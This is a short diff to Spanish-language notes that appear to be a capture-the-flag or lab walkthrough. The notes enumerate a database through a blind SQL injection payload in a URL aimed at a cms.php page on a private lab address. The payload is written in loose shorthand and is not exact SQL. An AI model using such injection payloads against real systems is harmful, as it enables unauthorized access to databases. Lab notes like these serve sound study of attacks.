@@ -88,5 +88,11 @@ ubuntu xenial
 
 
 lo importante son los ataques sql aca
-enumeracion de la BD
+
+enumeracion de la BD en este caso admin
+
+```sql
+http://192.168.100.48/imfadministrator/cms.php?pagename=home' or substring(database(),(1,2,3,4),1)='(a,d,m,i,n)
+```
+
 
